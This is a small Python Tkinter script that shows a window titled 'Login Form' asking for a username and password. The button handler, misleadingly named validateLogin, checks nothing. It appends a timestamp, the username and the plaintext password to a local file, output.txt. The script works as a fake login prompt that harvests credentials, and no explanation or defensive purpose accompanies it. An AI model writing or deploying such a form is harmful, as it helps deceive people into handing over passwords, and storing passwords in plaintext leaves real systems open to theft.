from datetime import datetime
from tkinter import *
from functools import partial

def validateLogin(username, password):
  #get the time 
  now = datetime.now()
  current_time = now.strftime("%d/%m/%Y %H:%M:%S")

  #write to the file
  f=open("output.txt","a")
  f.write(current_time)

 	#WRITE USERNAME and PASSWORD to file
  f.write("\nusername:" + username.get() + "\n")
  f.write("\npassword:" + password.get() + "\n")


 	#Close file
  f.close()

  #write time, username, and password to the console
  print(current_time)
  print("username:" + username.get())

  
  return

# Create Window 300x100 titled Login Form
window = Tk()
window.geometry("300x100+5+5")
window.title("Login Form")

# Create a label and text Entry for the username
username = StringVar()
use = Label(window, text="Username").grid(row=0, column=0)
usernameEntry = Entry(window, textvariable=username).grid(row=0, column=1)
#Create a label and password entry box
password = StringVar()
pas = Label(window, text="Password").grid(row=1, column=0)
passwordEntry = Entry(window, textvariable=password, show='*').grid(row=1, column=1)


validateLogin = partial(validateLogin, username, password)

#login button
loginButton = Button(window, text="Login", command=validateLogin).grid(row=4, column=0)

window.mainloop()